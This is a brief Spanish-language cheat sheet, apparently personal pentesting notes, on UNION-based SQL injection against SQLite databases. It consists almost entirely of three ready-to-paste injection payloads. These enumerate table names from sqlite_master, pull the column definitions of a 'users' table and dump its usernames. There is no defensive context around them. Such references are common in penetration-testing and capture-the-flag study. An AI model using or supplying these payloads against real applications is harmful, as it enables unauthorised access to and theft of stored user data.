# sqlite

# Sqlite

## Listar tablas

```
union select 1,group_concat(tbl_name),3,4 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'-- -
```

## Listar columnas

```
union select 1,group_concat(sql),3,4 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'-- -
```

## Dumpear datos

```
union select 1,group_concat(username),3,4 FROM users-- -
```